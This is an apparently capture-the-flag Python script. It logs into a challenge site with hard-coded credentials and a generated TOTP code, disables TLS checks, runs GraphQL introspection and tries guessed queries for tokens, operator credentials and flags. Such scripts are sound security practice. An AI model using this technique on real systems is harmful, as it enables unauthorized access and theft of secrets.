#!/usr/bin/env python3
"""Verifier (C2) — GraphQL introspection + query hunt for tokens/flags."""
import re, json, base64, hmac, hashlib, struct, time
import requests, urllib3
urllib3.disable_warnings()

BASE="https://verifier.hackthe.website"
TOTP_SECRET="JBSWY3DPEHPK3PXP"
FLAG_RE=re.compile(r'dome\.ctf\{[^}]+\}')
def totp():
    k=base64.b32decode(TOTP_SECRET)
    h=hmac.new(k,struct.pack(">Q",int(time.time()//30)),hashlib.sha1).digest()
    o=h[-1]&15
    return str((struct.unpack(">I",h[o:o+4])[0]&0x7fffffff)%10**6).zfill(6)

s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{BASE}/api/login", json={"username":"ops_dispatcher","password":"Ops-Fall-2026!"}, timeout=20)
s.post(f"{BASE}/api/otp/verify", json={"otp":totp()}, timeout=20)

def gql(query, variables=None):
    r=s.post(f"{BASE}/graphql", json={"query":query,"variables":variables or {}}, timeout=20)
    return r.status_code, r.text

# 1) introspection
INTRO="""query{__schema{queryType{name} mutationType{name}
 types{name kind fields{name args{name type{name kind ofType{name}}} type{name kind ofType{name kind ofType{name}}}}}}}"""
st,txt=gql(INTRO)
print("introspection:", st)
try:
    sch=json.loads(txt)["data"]["__schema"]
    print("  queryType:", sch["queryType"], "mutationType:", sch.get("mutationType"))
    for t in sch["types"]:
        if t["name"] and not t["name"].startswith("__") and t.get("fields"):
            if t["kind"]=="OBJECT" and t["name"] in ("Query","Mutation","Approval","Token","Operator","ApprovalRequest") or t["name"] in [sch["queryType"]["name"], (sch.get("mutationType") or {}).get("name")]:
                print(f"\n  type {t['name']}:")
                for f in t["fields"]:
                    args=",".join(a["name"] for a in (f.get("args") or []))
                    print(f"    {f['name']}({args})")
except Exception as e:
    print("  introspection parse err:", e, txt[:300])

# dump ALL object types/fields compactly
try:
    sch=json.loads(txt)["data"]["__schema"]
    print("\n  ALL object types + fields:")
    for t in sch["types"]:
        if t["name"] and not t["name"].startswith("__") and t["kind"]=="OBJECT" and t.get("fields"):
            print(f"    {t['name']}: "+", ".join(f["name"] for f in t["fields"]))
except: pass

# 2) try common queries
for q in [
  "{approvals{id status token principal service}}",
  "{approvals{id status token}}",
  "{tokens{value name role}}",
  "{operators{username token role}}",
  "{deploymentToken}",
  "{runnerToken}",
  "{me{username role token}}",
  "{flag}",
  "{approvalRequests{id approved token}}",
]:
    st,txt=gql(q)
    if st==200 and '"errors"' not in txt:
        print(f"\n  QUERY {q} -> {txt[:400]}")
        for m in FLAG_RE.finditer(txt): print("   *** FLAG:", m.group())
    elif st==200:
        # show first error only to learn field names
        try:
            errs=json.loads(txt).get("errors",[])
            if errs: print(f"  {q} err: {errs[0].get('message','')[:120]}")
        except: pass

for m in FLAG_RE.finditer(txt): print("FLAG:", m.group())
